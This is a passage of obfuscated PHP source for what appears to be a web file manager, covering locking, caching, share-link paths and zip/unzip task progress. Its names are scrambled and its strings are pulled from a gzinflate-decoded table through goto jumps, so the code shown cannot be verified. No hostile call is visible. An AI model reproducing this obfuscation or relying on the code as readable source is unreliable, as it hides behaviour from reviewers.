$˜ßøÕ¥…) . $¬ç¥Çè[929] . $ÙŒÌÕÀŒ . $¬ç¥Çè[930] . error_get_last(), $¬ç¥Çè[921]); show_json($©Şç›ƒ, !1); } if (!$Šßè§ñ†) { self::$lockItem[$ â±Ï¯º] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $›òØ”‹ = number_format(timeFloat() - $ñÂƒ…²¼, 3); write_log($¬ç¥Çè[931] . $ÙãêôŒç . $¬ç¥Çè[932] . $›òØ”‹, $¬ç¥Çè[921]); } return $ú éğ·å; } public static function lockGet($§»»ÀÉ³) { $ÙÌÀëæ¸ = self::key($§»»ÀÉ³); if (self::$lockItem[$ÙÌÀëæ¸]) { return self::$lockItem[$ÙÌÀëæ¸]; } return self::init()->lockGet($ÙÌÀëæ¸); } public static function unlock($ š‹ÃıÊ) { $Ãï—ùŒá =& $_SERVER[¿ğÚ‰±–]; $ë‚ûİÙ° = self::key($ š‹ÃıÊ); self::$lockItem[$ë‚ûİÙ°] = null; self::init()->unlock($ë‚ûİÙ°); if (GLOBAL_DEBUG_LOG_ALL) { write_log($Ãï—ùŒá[933] . $ š‹ÃıÊ, $Ãï—ùŒá[921]); } return; } public static function unlockRuntime() { $Ö‹îŸ¶€ =& $_SERVER[¿ğÚ‰±–]; $Üœ˜ŞÄ» = self::init(); $ç“Ö¤Ì = !1; foreach (self::$lockItem as $©àŠÊ„¬ => $ş™êñÔ) { if (!$ş™êñÔ) { continue; } $Üœ˜ŞÄ»->unlock($©àŠÊ„¬); if (!$ç“Ö¤Ì) { $ç“Ö¤Ì = !0; write_log($Ö‹îŸ¶€[934] . $©àŠÊ„¬ . $Ö‹îŸ¶€[74] . get_caller_msg(), $Ö‹îŸ¶€[921]); continue; } write_log($Ö‹îŸ¶€[934] . $©àŠÊ„¬, $Ö‹îŸ¶€[921]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $£ñˆ´¦Ç = number_format(timeFloat() - TIME_FLOAT, 3); write_log($Ö‹îŸ¶€[935] . $£ñˆ´¦Ç . $Ö‹îŸ¶€[936] . ACTION, $Ö‹îŸ¶€[921]); } } public static function fileLock($ÒåÍúú›) { $ê®Û”‘ =& $_SERVER[¿ğÚ‰±–]; if (!$GLOBALS[$ê®Û”‘[937]]) { $GLOBALS[$ê®Û”‘[937]] = array(); } $GLOBALS[$ê®Û”‘[937]][$ÒåÍúú›] = !1; $ŠÉÏ²×º = fopen(DATA_PATH . $ÒåÍúú› . $ê®Û”‘[938], $ê®Û”‘[939]); if (!$ŠÉÏ²×º) { return !1; } $GLOBALS[$ê®Û”‘[937]][$ÒåÍúú›] = $ŠÉÏ²×º; if (flock($ŠÉÏ²×º, LOCK_EX)) { return !0; } self::unlock($ÒåÍúú›); show_json($ê®Û”‘[940], !1); return !1; } public static function fileUnlock($Ó÷ûÙœ£) { $¤ßåœ½ =& $_SERVER[¿ğÚ‰±–]; $û ÙÔÅ = $GLOBALS[$¤ßåœ½[937]][$Ó÷ûÙœ£]; if (!$û ÙÔÅ) { return; } $GLOBALS[$¤ßåœ½[937]][$Ó÷ûÙœ£] = !1; flock($û ÙÔÅ, LOCK_UN); fclose($û ÙÔÅ); } public static function fileUnlockAll() { $ÂÎ«ó£ =& $_SERVER[¿ğÚ‰±–]; if (!isset($GLOBALS[$ÂÎ«ó£[937]]) || !$GLOBALS[$ÂÎ«ó£[937]]) { return; } foreach ($GLOBALS[$ÂÎ«ó£[937]] as $ÖèÆÆ¶ => $îò…ø¿‹) { if (!$îò…ø¿‹) { continue; } $GLOBALS[$ÂÎ«ó£[937]][$ÖèÆÆ¶] = !1; flock($îò…ø¿‹, LOCK_UN); fclose($îò…ø¿‹); } $GLOBALS[$ÂÎ«ó£[937]] = array(); } } goto F¾èà³¼‰ğ; bÇ¹µ´’Œ¾: define($_SERVER[¿ğÚ‰±–][0], $_SERVER[¿ğÚ‰±–][1]); $_SERVER[ÓÄÍòáÒ] = explode($_SERVER[¿ğÚ‰±–][2], gzinflate(substr($_SERVER[¿ğÚ‰±–][3], 10, -8))); function binCheckEq($şˆÚëªî, $ğ®‘–ù¹) { return $şˆÚëªî == $ğ®‘–ù¹; } goto F©‰¿¢î©; a‰ºŸòÕ‰’: class PathDriverDbShareLink extends PathDriverDB { public function __construct($¦¤åßî¼) { $this->pathParse = $¦¤åßî¼; $this->model = Model($_SERVER[¿ğÚ‰±–][1425]); } protected function infoParse($ìûº§µÀ, $¨¢£†ô = false, $³Ş­äë© = false) { $›ö¥¸½” =& $_SERVER[¿ğÚ‰±–]; return Action($›ö¥¸½”[1263])->sharePathInfo($this->pathParse[$›ö¥¸½”[87]], !0, $¨¢£†ô); } public function listPath($ß¢è®ËÊ, $¿óì¤Ùô = false) { $Ú”ÂüûŒ =& $_SERVER[¿ğÚ‰±–]; $Á½ÅîÉ = parent::listPath($ß¢è®ËÊ, $¿óì¤Ùô); if (!$Á½ÅîÉ) { return $Á½ÅîÉ; } if (is_array($Á½ÅîÉ[$Ú”ÂüûŒ[1433]])) { $Á½ÅîÉ[$Ú”ÂüûŒ[1433]] = Action($Ú”ÂüûŒ[1263])->shareItemInfo($Á½ÅîÉ[$Ú”ÂüûŒ[1433]]); } foreach ($Á½ÅîÉ as $¢øıàÇ => $ÑŒ·‘Œ§) { if (!in_array($¢øıàÇ, array($Ú”ÂüûŒ[86], $Ú”ÂüûŒ[85]))) { continue; } foreach ($ÑŒ·‘Œ§ as $àÎ¾«ªí => $Ú³öàÇÄ) { $Á½ÅîÉ[$¢øıàÇ][$àÎ¾«ªí] = Action($Ú”ÂüûŒ[1263])->shareItemInfo($Ú³öàÇÄ); } } return $Á½ÅîÉ; } public function listAll($Ü‰ËÑª) { $‚š£ÈÀ =& $_SERVER[¿ğÚ‰±–]; $ŞÃÛú³Ë = IO::info($this->pathParse[$‚š£ÈÀ[87]]); if (!$ŞÃÛú³Ë) { return array(); } $¡ª³ƒº = $this->model->listAll($Ü‰ËÑª); foreach ($¡ª³ƒº as &$¶ ÁÅš™) { $¶ ÁÅš™[$‚š£ÈÀ[90]] = Action($‚š£ÈÀ[1263])->shareItemInfo($¶ ÁÅš™[$‚š£ÈÀ[90]]); } unset($¶ ÁÅš™); return $¡ª³ƒº; } } class PathDriverDriverShareItem { public function __construct($‘Ò»ÈäÔ) { $this->pathParse = $‘Ò»ÈäÔ; } public function __call($¦·¾¿ƒ¿, $¢‰–ƒ«Ÿ) { $ë˜¡ÍŞ  =& $_SERVER[¿ğÚ‰±–]; if (method_exists($this, $¦·¾¿ƒ¿)) { return; } $ƒ€˜ß±ï = call_user_func_array(array($ë˜¡ÍŞ [1434], $¦·¾¿ƒ¿), $¢‰–ƒ«Ÿ); $Ó–´œı• = array($ë˜¡ÍŞ [1435], $ë˜¡ÍŞ [1436], $ë˜¡ÍŞ [1437], $ë˜¡ÍŞ [1438], $ë˜¡ÍŞ [618], $ë˜¡ÍŞ [620], $ë˜¡ÍŞ [1439], $ë˜¡ÍŞ [110], $ë˜¡ÍŞ [1440], $ë˜¡ÍŞ [1441]); if (in_array($¦·¾¿ƒ¿, $Ó–´œı•)) { $ƒ€˜ß±ï = $this->getPathOuter($ƒ€˜ß±ï); } return $ƒ€˜ß±ï; } public function copy($ğØÉÉ‚½, $­ÃØ–ôÚ, $¢Ğö¯ŸÅ = false, $—ÃáâäÄ = false) { return $this->copyMove($ğØÉÉ‚½, $­ÃØ–ôÚ, $¢Ğö¯ŸÅ, $_SERVER[¿ğÚ‰±–][618], $—ÃáâäÄ); } public function move($ÙóşÂ×, $÷×†“‰Ø, $˜ÀÆ¨šö = false, $öÀäŠ¦Å = false) { return $this->copyMove($ÙóşÂ×, $÷×†“‰Ø, $˜ÀÆ¨šö, $_SERVER[¿ğÚ‰±–][620], $öÀäŠ¦Å); } private function copyMove($å°ÚÕÕé, $ĞÊ¦‡ûà, $– ¹Ô, $˜ù“®Ó, $¨ú¡ğ” = false) { $à¥™«ƒ =& $_SERVER[¿ğÚ‰±–]; $ˆà­êê† = $ĞÊ¦‡ûà; $¸ú¤¶… = IO::driverMake($ĞÊ¦‡ûà); if ($¸ú¤¶…->pathParse[$à¥™«ƒ[1239]]) { $ĞÊ¦‡ûà = $¸ú¤¶…->pathParse[$à¥™«ƒ[1239]]; } else { $ĞÊ¦‡ûà = $ˆà­êê†; } $ÎÑá¾Ãí = IO::copyMove($å°ÚÕÕé, $ĞÊ¦‡ûà, $– ¹Ô, $˜ù“®Ó, $¨ú¡ğ”); $ÎÑá¾Ãí = $this->getPathOuter($ÎÑá¾Ãí); return $ÎÑá¾Ãí; } public function pathThis($é”½‡™­) { return get_path_this($this->pathParse[$_SERVER[¿ğÚ‰±–][87]]); } public function pathFather($ûŒÎ±ï) { return get_path_father($this->pathParse[$_SERVER[¿ğÚ‰±–][87]]); } public function iconvSystem($åÀ­Ø¹ä) { return $åÀ­Ø¹ä; } protected function infoParse($È§…¤›Ê, $‚´ÅëÇ¾ = false) { $çÍÙƒœ» =& $_SERVER[¿ğÚ‰±–]; $¨¦‹Ş‹¸ = $this->pathParse[$çÍÙƒœ»[560]][$çÍÙƒœ»[1264]] . $this->pathParse[$çÍÙƒœ»[1257]]; if ($‚´ÅëÇ¾) { $®ÌÓõõË = IO::infoWithChildren($¨¦‹Ş‹¸); } else { $®ÌÓõõË = IO::info($¨¦‹Ş‹¸); } $ğ‚È‹Üä = $this->pathParse[$çÍÙƒœ»[560]]; return Action($çÍÙƒœ»[1432])->_shareItemeParse($®ÌÓõõË, $ğ‚È‹Üä); } public function listAll($§Õ¬ª”ª) { $†öîÆîÁ =& $_SERVER[¿ğÚ‰±–]; $ ‡¶Å Ü = IO::listAll($§Õ¬ª”ª); $ñãç½ÔÜ = rtrim($this->pathParse[$†öîÆîÁ[560]][$†öîÆîÁ[1264]], $†öîÆîÁ[8]); foreach ($ ‡¶Å Ü as &$Ÿ¿‘ä—) { $Ÿ¿‘ä—[$†öîÆîÁ[87]] = $this->pathDriver . $†öîÆîÁ[8] . ltrim(substr($Ÿ¿‘ä—[$†öîÆîÁ[87]], strlen($ñãç½ÔÜ)), $†öîÆîÁ[8]); } unset($Ÿ¿‘ä—); return $ ‡¶Å Ü; } public function listAllSimple($äÆâ¤ ‡, $„ôòöŒ† = false) { $±÷•£Ÿã =& $_SERVER[¿ğÚ‰±–]; $´¥ö­ë† = $this->listAll($äÆâ¤ ‡); $€ ‘‹Î = $this->pathParse[$±÷•£Ÿã[495]]; if (trim($€ ‘‹Î, $±÷•£Ÿã[8]) == trim(get_path_father($€ ‘‹Î), $±÷•£Ÿã[8])) { $„ôòöŒ† = !0; } return IO::init($±÷•£Ÿã[12])->listAllSimpleMake($´¥ö­ë†, $€ ‘‹Î, $„ôòöŒ†); } public function getPathOuter($µÚ¦ÕÆê) { $¬İïå¸‚ =& $_SERVER[¿ğÚ‰±–]; $´ĞÙ€µ› = KodIO::parse($µÚ¦ÕÆê); if ($´ĞÙ€µ›[$¬İïå¸‚[33]] == KodIO::KOD_SHARE_ITEM) { return $´ĞÙ€µ›[$¬İïå¸‚[87]]; } $…€¢àó = KodIO::clear($µÚ¦ÕÆê); $£¥ÃÁÜü = KodIO::clear($this->pathParse[$¬İïå¸‚[560]][$¬İïå¸‚[1264]]); $øêÄ‰™¡ = substr($…€¢àó, strlen($£¥ÃÁÜü)); if (substr($…€¢àó, 0, strlen($£¥ÃÁÜü)) != $£¥ÃÁÜü) { return !1; } return $this->pathParse[$¬İïå¸‚[1258]] . $¬İïå¸‚[8] . ltrim($øêÄ‰™¡, $¬İïå¸‚[8]); } public function getType() { $øÍ¤ÛÏ =& $_SERVER[¿ğÚ‰±–]; $ç¦‰»‘È = str_replace($øÍ¤ÛÏ[77], $øÍ¤ÛÏ[12], get_class($this)); return strtolower($ç¦‰»‘È); } public function isOsDriver($œè¯„Ü˜) { return IO::isOsDriver($œè¯„Ü˜); } public function info($Ùé°ùè») { return $this->infoParse($Ùé°ùè»); } public function infoAuth($±‚Ÿª‡œ) { return $this->infoParse($±‚Ÿª‡œ); } public function infoWithChildren($ÜàÈ““ƒ) { return $this->infoParse($ÜàÈ““ƒ, !0); } public function infoFull($±ø…ç…) { return $this->infoParse($±ø…ç…); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($Ó÷Æ×ÖÀ) { $this->pathParse = $Ó÷Æ×ÖÀ; } protected function infoParse($÷ó¦¢Ôœ, $¶»¼ßŞï = false) { $–Ï‡ô¥‹ =& $_SERVER[¿ğÚ‰±–]; return Action($–Ï‡ô¥‹[1263])->sharePathInfo($this->pathParse[$–Ï‡ô¥‹[87]], !0, $¶»¼ßŞï); } public function listPath($ÔÑøªñ, $ŠĞÏí¹ø = false) { $±Ğ÷ë‰ =& $_SERVER[¿ğÚ‰±–]; $ƒ³¨Õ’× = IO::listPath($ÔÑøªñ, $ŠĞÏí¹ø); if (!$ƒ³¨Õ’×) { return $ƒ³¨Õ’×; } if (is_array($ƒ³¨Õ’×[$±Ğ÷ë‰[1433]])) { $Ûòìï¶— = Action($±Ğ÷ë‰[1442])->parsePathChildren($ƒ³¨Õ’×[$±Ğ÷ë‰[1433]], array($±Ğ÷ë‰[495] => $ÔÑøªñ)); $ƒ³¨Õ’×[$±Ğ÷ë‰[1433]] = Action($±Ğ÷ë‰[1263])->shareItemInfo($Ûòìï¶—); } foreach ($ƒ³¨Õ’× as $çÍ¡³ı¯ => $ò­¦¨¿¢) { if (!in_array($çÍ¡³ı¯, array($±Ğ÷ë‰[86], $±Ğ÷ë‰[85]))) { continue; } foreach ($ò­¦¨¿¢ as $ÏÌœ¬ÉÆ => $Ûòìï¶—) { $Ûòìï¶— = Action($±Ğ÷ë‰[1442])->parsePathChildren($Ûòìï¶—, array($±Ğ÷ë‰[495] => $ÔÑøªñ)); $ƒ³¨Õ’×[$çÍ¡³ı¯][$ÏÌœ¬ÉÆ] = Action($±Ğ÷ë‰[1263])->shareItemInfo($Ûòìï¶—); } } return $ƒ³¨Õ’×; } } goto dÁ«÷¼ï±¦; FîÑù‡âî: class CacheLockMemcached { public function lock($òÍÍ£™¸, $æøª¨œ = 0) { $¼ÚúÒ = Cache::init(); $çÌ±¨Ë = microtime(!0) + $æøª¨œ; while (microtime(!0) < $çÌ±¨Ë) { $êÅÔÃƒÇ = $¼ÚúÒ->get($òÍÍ£™¸); if (!$êÅÔÃƒÇ || $êÅÔÃƒÇ < microtime(!0)) { $ï§†ê†¿ = $¼ÚúÒ->handle->add($òÍÍ£™¸, $çÌ±¨Ë, $æøª¨œ); if ($ï§†ê†¿) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($Êé¶œ©…) { return Cache::init()->get($Êé¶œ©…); } public function unlock($ë’¶©« ) { return Cache::init()->remove($ë’¶©« ); } } class CacheLockDatabase { public function lock($×‘„ƒÒÓ, $Öí»ÆÎ¹ = 0) { $”ı³íèÎ = Model($_SERVER[¿ğÚ‰±–][906]); $ÅƒåÙ•Å = microtime(!0) + $Öí»ÆÎ¹; while (microtime(!0) < $ÅƒåÙ•Å) { $±Õ´ûû• = $”ı³íèÎ->get($×‘„ƒÒÓ); if (!$±Õ´ûû• || $±Õ´ûû• < microtime(!0)) { $‡ø±õ’ = $”ı³íèÎ->set($×‘„ƒÒÓ, $ÅƒåÙ•Å); if ($‡ø±õ’) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($ŞşÜˆÈ) { return Model($_SERVER[¿ğÚ‰±–][906])->get($ŞşÜˆÈ); } public function unlock($ìÁìß×Ô) { Model($_SERVER[¿ğÚ‰±–][906])->remove($ìÁìß×Ô); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($ˆøèÄš, $Á½ç¯óµ) { $©ïÃÀÚ =& $_SERVER[¿ğÚ‰±–]; if (!class_exists($©ïÃÀÚ[944])) { show_json($©ïÃÀÚ[945], !1); } $this->cacheTime = $Á½ç¯óµ; $this->handle = new Memcached(); if (is_array($ˆøèÄš[$©ïÃÀÚ[946]]) && count($ˆøèÄš[$©ïÃÀÚ[946]]) >= 1) { foreach ($ˆøèÄš[$©ïÃÀÚ[946]] as $ä—Æİ›·) { $•ÅùÒ³ = explode($©ïÃÀÚ[4], $ä—Æİ›·); $this->handle->addServer($•ÅùÒ³[0], $•ÅùÒ³[1]); } } else { $this->handle->addServer($ˆøèÄš[$©ïÃÀÚ[208]], $ˆøèÄš[$©ïÃÀÚ[209]]); } } public function set($¡äİ¶Î, $÷³ ‹ó, $‹Œ‘åÔ = false) { $‹Œ‘åÔ = $‹Œ‘åÔ ? $‹Œ‘åÔ : $this->cacheTime; return $this->handle->set($¡äİ¶Î, $÷³ ‹ó, $‹Œ‘åÔ); } public function get($Ñõ¬ÓŠ—) { return $this->handle->get($Ñõ¬ÓŠ—); } public function remove($›™íÙÆ‚) { return $this->handle->delete($›™íÙÆ‚); } public function deleteAll() { return $this->handle->flush(); } } goto E«¦ğ¦ç“¡; C‡‘ˆó›Çæ: class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($¼ª¡ë­¸, $¬Ê¡Í¼… = 5.0) { if (!$¼ª¡ë­¸) { return; } $…¸§Âñ‹ = Cache::get($¼ª¡ë­¸); if (!$…¸§Âñ‹ || timeFloat() - floatVal($…¸§Âñ‹) >= $¬Ê¡Í¼…) { Cache::set($¼ª¡ë­¸, timeFloat(), $¬Ê¡Í¼… * 10); return !0; } return !1; } public static function timeLimitCall($¾Í†¤ç², $úñ’††¯, $²ÛîÆ·, $“ŞÔÊËû = 5.0) { $÷¼½È½ı =& $_SERVER[¿ğÚ‰±–]; if (!$¾Í†¤ç² || !$úñ’††¯) { return; } self::$asyncAdd = !0; $ƒÆ÷İ¼¿ = $÷¼½È½ı[1883]; $ı‚¢ôª = Cache::get($ƒÆ÷İ¼¿, !0); $‘·ˆ„£Ã = array($÷¼½È½ı[1884] => timeFloat(), $÷¼½È½ı[1885] => timeFloat(), $÷¼½È½ı[341] => $úñ’††¯, $÷¼½È½ı[1875] => $²ÛîÆ·, $÷¼½È½ı[206] => $“ŞÔÊËû); if (is_array($ı‚¢ôª[$¾Í†¤ç²])) { $‘·ˆ„£Ã[$÷¼½È½ı[1885]] = $ı‚¢ôª[$¾Í†¤ç²][$÷¼½È½ı[1885]]; } if (is_array($ı‚¢ôª[$¾Í†¤ç²])) { if (timeFloat() - $ı‚¢ôª[$¾Í†¤ç²][$÷¼½È½ı[1884]] < $‘·ˆ„£Ã[$÷¼½È½ı[206]] * 0.3) { return; } $‘·ˆ„£Ã[$÷¼½È½ı[1885]] = $ı‚¢ôª[$¾Í†¤ç²][$÷¼½È½ı[1885]]; } $ı‚¢ôª[$¾Í†¤ç²] = $‘·ˆ„£Ã; Cache::set($ƒÆ÷İ¼¿, $ı‚¢ôª, 60); Cache::removeMemory($ƒÆ÷İ¼¿); write_log($÷¼½È½ı[1886] . $¾Í†¤ç² . $÷¼½È½ı[74] . $úñ’††¯, $÷¼½È½ı[197]); } public static function timeLimitCallLoop() { $ÉÊ¥¼Õ° =& $_SERVER[¿ğÚ‰±–]; $ïÇõœÆá = array($ÉÊ¥¼Õ°[1887]); $œ³²™×é = in_array(strtolower(ACTION), $ïÇõœÆá); if (!$œ³²™×é && !self::$asyncAdd) { return; } $ƒİÜú‡ = $ÉÊ¥¼Õ°[1883]; $Ô¾øÄÔ = Cache::get($ƒİÜú‡, !0); if (!$Ô¾øÄÔ || count($Ô¾øÄÔ) <= 0) { return; } $½§ß¼ì‘ = !1; $ìû³×íá = timeFloat(); $‰¡ö“²Ó = array(); foreach ($Ô¾øÄÔ as $Å‚†ú„Ê => $†õ»ìËÄ) { if ($ìû³×íá - $†õ»ìËÄ[$ÉÊ¥¼Õ°[1885]] > $†õ»ìËÄ[$ÉÊ¥¼Õ°[206]]) { $½§ß¼ì‘ = !0; try { Hook::apply($†õ»ìËÄ[$ÉÊ¥¼Õ°[341]], $†õ»ìËÄ[$ÉÊ¥¼Õ°[1875]]); write_log($ÉÊ¥¼Õ°[1888] . $Å‚†ú„Ê . $ÉÊ¥¼Õ°[74] . $†õ»ìËÄ[$ÉÊ¥¼Õ°[341]] . $ÉÊ¥¼Õ°[1889] . ACTION, $ÉÊ¥¼Õ°[197]); } catch (Exception $ÜÚ·Š¹€) { } continue; } $‰¡ö“²Ó[$Å‚†ú„Ê] = $†õ»ìËÄ; } if (!$½§ß¼ì‘) { return; } if (!$‰¡ö“²Ó) { return Cache::remove($ƒİÜú‡); } Cache::set($ƒİÜú‡, $‰¡ö“²Ó, 60); Cache::removeMemory($ƒİÜú‡); } public static function finished($å‚éıí, $×ğÖÙüŒ) { $’©ââÑİ =& $_SERVER[¿ğÚ‰±–]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($’©ââÑİ[341] => $å‚éıí, $’©ââÑİ[1875] => $×ğÖÙüŒ); } private static function finishedRun() { $ÊÈôùÂÖ =& $_SERVER[¿ğÚ‰±–]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $©«Í­) { try { Hook::apply($©«Í­[$ÊÈôùÂÖ[341]], $©«Í­[$ÊÈôùÂÖ[1875]]); } catch (Exception $ù´üğ) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $šË‰‘‘ =& $_SERVER[¿ğÚ‰±–]; parent::startAfter(); Hook::bind($šË‰‘‘[1890], array($this, $šË‰‘‘[1891])); Hook::bind($šË‰‘‘[1285], array($this, $šË‰‘‘[1892])); Hook::bind($šË‰‘‘[1893], array($this, $šË‰‘‘[1894])); $‰ğ×ı¸ =& $this->task; $‰ğ×ı¸[$šË‰‘‘[1895]] = $šË‰‘‘[1286]; if (!$‰ğ×ı¸[$šË‰‘‘[1666]]) { $‰ğ×ı¸[$šË‰‘‘[1666]] = LNG($šË‰‘‘[1896]); } } protected function endAfter() { $»••‹åÔ =& $_SERVER[¿ğÚ‰±–]; parent::endAfter(); Hook::unbind($»••‹åÔ[1890], array($this, $»••‹åÔ[1891])); Hook::unbind($»••‹åÔ[1285], array($this, $»••‹åÔ[1892])); Hook::unbind($»••‹åÔ[1893], array($this, $»••‹åÔ[1894])); } public function updateAfter() { $‰‡Éì÷ =& $_SERVER[¿ğÚ‰±–]; $Ã¯‹¡Å =& $this->task; if (!$Ã¯‹¡Å[$‰‡Éì÷[1148]] || !$Ã¯‹¡Å[$‰‡Éì÷[841]]) { if ($Ã¯‹¡Å[$‰‡Éì÷[1895]] != $‰‡Éì÷[389]) { return; } } if ($Ã¯‹¡Å[$‰‡Éì÷[1895]] == $‰‡Éì÷[1286]) { $¸¥•úø³ = 0; if ($Ã¯‹¡Å[$‰‡Éì÷[1830]]) { $¸¥•úø³ = $Ã¯‹¡Å[$‰‡Éì÷[1831]] / $Ã¯‹¡Å[$‰‡Éì÷[1830]]; } $Ã¯‹¡Å[$‰‡Éì÷[1779]] = $¸¥•úø³ * 0.3; } else { if ($Ã¯‹¡Å[$‰‡Éì÷[1895]] == $‰‡Éì÷[389]) { $¸¥•úø³ = $Ã¯‹¡Å[$‰‡Éì÷[1778]] / $Ã¯‹¡Å[$‰‡Éì÷[1148]]; $Ã¯‹¡Å[$‰‡Éì÷[1779]] = 0.3 + $¸¥•úø³ * 0.4; } else { if ($Ã¯‹¡Å[$‰‡Éì÷[1895]] == $‰‡Éì÷[110]) { $ÂŒáÄ‚Ë = 0; if ($Ã¯‹¡Å[$‰‡Éì÷[1832]] == $‰‡Éì÷[110]) { $ÂŒáÄ‚Ë = $Ã¯‹¡Å[$‰‡Éì÷[1831]]; } $¸¥•úø³ = ($Ã¯‹¡Å[$‰‡Éì÷[1835]] + $ÂŒáÄ‚Ë) / $Ã¯‹¡Å[$‰‡Éì÷[841]]; $Ã¯‹¡Å[$‰‡Éì÷[1779]] = 0.3 + 0.4 + $¸¥•úø³ * 0.3; } } } if ($Ã¯‹¡Å[$‰‡Éì÷[1779]] > 0) { $Ã—¤‹›¢ = timeFloat() - $Ã¯‹¡Å[$‰‡Éì÷[1781]] - $Ã¯‹¡Å[$‰‡Éì÷[1784]]; $Ã¯‹¡Å[$‰‡Éì÷[1785]] = $Ã—¤‹›¢ * (1 - $Ã¯‹¡Å[$‰‡Éì÷[1779]]) / $Ã¯‹¡Å[$‰‡Éì÷[1779]]; } } public function addFile($¹ºú ·) { $Û†Ù¾×« =& $_SERVER[¿ğÚ‰±–]; $ƒäéüŠ =& $this->task; $å×¿Ä• = IO::info($¹ºú ·); $ƒäéüŠ[$Û†Ù¾×«[1828]] = $å×¿Ä•[$Û†Ù¾×«[32]]; $ƒäéüŠ[$Û†Ù¾×«[1830]] = $å×¿Ä•[$Û†Ù¾×«[79]]; $ƒäéüŠ[$Û†Ù¾×«[1831]] = 0; $ƒäéüŠ[$Û†Ù¾×«[1150]] = $Û†Ù¾×«[1851]; $ƒäéüŠ[$Û†Ù¾×«[1832]] = $Û†Ù¾×«[1286]; $ƒäéüŠ[$Û†Ù¾×«[841]] = $å×¿Ä•[$Û†Ù¾×«[79]]; $ƒäéüŠ[$Û†Ù¾×«[1148]] = 1; $ªÔ™½è = 0; $ƒäéüŠ[$Û†Ù¾×«[1839]] = array($Û†Ù¾×«[1840] => $ªÔ™½è + 1, $Û†Ù¾×«[494] => $å×¿Ä•[$Û†Ù¾×«[32]], $Û†Ù¾×«[87] => $å×¿Ä•[$Û†Ù¾×«[87]], $Û†Ù¾×«[582] => $å×¿Ä•[$Û†Ù¾×«[582]] ? $å×¿Ä•[$Û†Ù¾×«[582]] : $å×¿Ä•[$Û†Ù¾×«[87]]); $this->update(); } public function zipEvent($Åê˜ÓÀ¶, $€©™È÷, $ÛÖÀÍû–, $¤ƒï„ó) { $îœÙ°ù› =& $_SERVER[¿ğÚ‰±–]; $İæÁùØ³ =& $this->task; $İæÁùØ³[$îœÙ°ù›[1828]] = get_path_this($€©™È÷); $İæÁùØ³[$îœÙ°ù›[1830]] = $¤ƒï„ó; $İæÁùØ³[$îœÙ°ù›[1831]] = $ÛÖÀÍû–; $İæÁùØ³[$îœÙ°ù›[1150]] = $Åê˜ÓÀ¶ == $îœÙ°ù›[1897] ? $îœÙ°ù›[1898] : $îœÙ°ù›[1899]; $İæÁùØ³[$îœÙ°ù›[1832]] = $îœÙ°ù›[12]; $İæÁùØ³[$îœÙ°ù›[841]] = $¤ƒï„ó; $İæÁùØ³[$îœÙ°ù›[1895]] = $îœÙ°ù›[389]; $this->update(); } public function unzipAfter($êï±ˆå) { $ò¾‰£´â =& $_SERVER[¿ğÚ‰±–]; $å£’Ê×È =& $this->task; $å£’Ê×È[$ò¾‰£´â[1895]] = $ò¾‰£´â[110]; $ƒÙİ»Ã‘ = IO::infoWithChildren($êï±ˆå); $íßæş§ = 0; $å£’Ê×È[$ò¾‰£´â[1839]] = array($ò¾‰£´â[1840] => $íßæş§ + 1, $ò¾‰£´â[494] => $ƒÙİ»Ã‘[$ò¾‰£´â[32]], $ò¾‰£´â[87] => $ƒÙİ»Ã‘[$ò¾‰£´â[87]], $ò¾‰£´â[582] => $ƒÙİ»Ã‘[$ò¾‰£´â[582]] ? $ƒÙİ»Ã‘[$ò¾‰£´â[582]] : $ƒÙİ»Ã‘[$ò¾‰£´â[87]]); if ($ƒÙİ»Ã‘[$ò¾‰£´â[33]] == $ò¾‰£´â[230]) { $å£’Ê×È[$ò¾‰£´â[1148]] = 1; } else { $å£’Ê×È[$ò¾‰£´â[1148]] = $ƒÙİ»Ã‘[$ò¾‰£´â[82]][$ò¾‰£´â[80]]; } $å£’Ê×È[$ò¾‰£´â[1150]] = $ò¾‰£´â[12]; $å£’Ê×È[$ò¾‰£´â[1832]] = 0; $å£’Ê×È[$ò¾‰£´â[1778]] = 0; $å£’Ê×È[$ò¾‰£´â[1830]] = 0; $å£’Ê×È[$ò¾‰£´â[1831]] = 0; $å£’Ê×È[$ò¾‰£´â[1828]] = $ò¾‰£´â[12]; $å£’Ê×È[$ò¾‰£´â[1835]] = 0; $å£’Ê×È[$ò¾‰£´â[841]] = $ƒÙİ»Ã‘[$ò¾‰£´â[79]]; $this->update(); self::log($ò¾‰£´â[1900] . json_encode(array($å£’Ê×È, $ƒÙİ»Ã‘))); } public function nameParse($ô÷¼ù•±) { $¶¯à„Õ§ =& $_SERVER[¿ğÚ‰±–]; $¹ª¬¶â· =& $this->task; if ($¹ª¬¶â·[$¶¯à„Õ§[1895]] == $¶¯à„Õ§[1286]) { $¹ª¬¶â·[$¶¯à„Õ§[1895]] = $¶¯à„Õ§[389]; $¹ª¬¶â·[$¶¯à„Õ§[1835]] = 0; $¹ª¬¶â·[$¶¯à„Õ§[841]] = 0; } $ÛÃéøÜÇ = get_path_this($ô÷¼ù•±); if (strstr($ÛÃéøÜÇ, $¶¯à„Õ§[10])) { $¹ª¬¶â·[$¶¯à„Õ§[1778]] += 1; $¹ª¬¶â·[$¶¯à„Õ§[1148]] += 1; } $¹ª¬¶â·[$¶¯à„Õ§[1828]] = $ô÷¼ù•±; $this->update(); } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $Ü¹©€¤ñ =& $_SERVER[¿ğÚ‰±–]; parent::startAfter(); Hook::bind($Ü¹©€¤ñ[1901], array($this, $Ü¹©€¤ñ[1891])); Hook::bind($Ü¹©€¤ñ[1893], array($this, $Ü¹©€¤ñ[1894])); $°…á¸û =& $this->task; $°…á¸û[$Ü¹©€¤ñ[1895]] = $Ü¹©€¤ñ[1286]; if (!$°…á¸û[$Ü¹©€¤ñ[1666]]) { $°…á¸û[$Ü¹©€¤ñ[1666]] = LNG($Ü¹©€¤ñ[1902]); } } protected function endAfter() { $¤¼ôïöƒ =& $_SERVER[¿ğÚ‰±–]; parent::endAfter(); 